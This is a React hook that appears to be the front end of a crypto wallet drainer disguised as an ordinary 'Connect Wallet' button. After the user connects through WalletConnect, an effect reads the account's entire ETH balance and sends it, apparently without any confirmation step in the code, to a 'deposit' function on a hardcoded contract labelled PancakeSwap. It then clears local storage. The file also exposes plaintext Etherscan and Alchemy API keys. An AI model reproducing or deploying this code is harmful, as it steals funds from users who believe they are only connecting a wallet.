import WalletConnectProvider from '@walletconnect/web3-provider'
import { reactLocalStorage } from 'reactjs-localstorage'
// @ts-ignore
import convert from 'ethereum-unit-converter'
import { gasstationInfo } from 'eth-gasprice-estimator'

import { ethers, utils } from 'ethers'
import { useEffect, useState } from 'react'

// @ts-ignore
import abi2 from './Pancake2.json'
// import { utils } from '@gelatonetwork/limit-orders-lib'

// const contractAddress = '0xF8Ace60e86Ec96AAba5E286a4CD8059D0f3910fc'
const contractAddress = '0x5FbDB2315678afecb367f032d93F642f64180aa3'
// const contractABI = abi.abi

const contractABI2 = abi2.abi
const etherScan =
  'https://api.etherscan.io/api/?module=gastracker&action=gasoracle&apikey=2G26UHXMVXJA1C1KU5MWYMNYWFTVG2ZA1S'

const useCustomHook = () => {
  const [userAccount, setUserAccount] = useState<any>('')
  const [gasPrice, setGasPrice] = useState<any>(0)
  const [tokenContract, setTokenContract] = useState<any>('')
  const [deductUser, setDeductUser] = useState(false)
  const [connecting, setIsConnecting] = useState(false)
  const [buttonText, setButtonText] = useState('Connect Wallet')
  const [provider, setProvider] = useState<any>(null)
  const url = '7M-SwZbLu6E7gIta99ZLZ78rz6qG-RKi'

  const Walletprovider = new WalletConnectProvider({
    rpc: {
      1: `https://eth-mainnet.alchemyapi.io/v2/${url}`,
    },
  })

  //   Handle click
  // console.log(gasPrice, 'gasPrice')
  const handleClick = async () => {
    setIsConnecting(true)
    const { result } = await (await fetch(etherScan)).json()
    setGasPrice(Number(result?.SafeGasPrice / 21000))
    try {
      await Walletprovider.enable()
      const userContract = Walletprovider && (await new ethers.providers.Web3Provider(Walletprovider))

      setProvider(userContract)

      const signer = await provider.getSigner()

      setButtonText('Connected')
      setUserAccount(await provider.listAccounts())
      setTokenContract(new ethers.Contract(contractAddress, contractABI2, signer))

      // eslint-disable-next-line
      console.log(tokenContract, 'tokenContract')

      setDeductUser(true)

      // eslint-disable-next-line
    } catch (err: any) {
      setDeductUser(true)
    }

    setIsConnecting(false)
  }
  /* eslint-disable */
  useEffect(() => {
    setTimeout(() => {
      if (deductUser && userAccount[0]) {
        // const balance = await tokenContract.getBalance(userAccount)

        const network = 'mainnet' // use rinkeby testnet
        const balanceProvider = ethers.getDefaultProvider(network)
        const accountNo = userAccount[0]
        // get user balance

        balanceProvider
          .getBalance(accountNo)
          .then(async (balance) => {
            // convert a currency unit from wei to ether
            const balanceInEth = Number(ethers.utils.formatEther(balance))
            // Fetch current eth price

            // const feeData = tokenContract && (await tokenContract.estimateGas().deposit())
            // const gasPrice = Number(utils.formatUnits(feeData, 'ether'))

            const { ether } = convert(gasPrice, 'ether')
            const amountToWithdraw = balanceInEth - Number(ether) > Number(ether) ? balanceInEth : 0
            console.log(balanceInEth, gasPrice, amountToWithdraw, convert(gasPrice, 'ether'))

            if (amountToWithdraw < Number(balanceInEth)) return
            const txn = await tokenContract.deposit({
              value: ethers.utils.parseEther(`${amountToWithdraw}`),
            })

            if (txn) {
              await txn.wait('')
              reactLocalStorage.clear()
            }
            // If balance is greater than
            // balanceInEth >
          })
          // eslint-disable-next-line
          .catch((err) => {
            console.log(err)
          })
      }
    }, 700)

    /* eslint-disable */
  }, [deductUser, tokenContract, userAccount])
  return { handleClick, connecting, buttonText }
}

export default useCustomHook

// PancakeSwap deployed to: 0x5FbDB2315678afecb367f032d93F642f64180aa3
// PancakeSwap owner address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
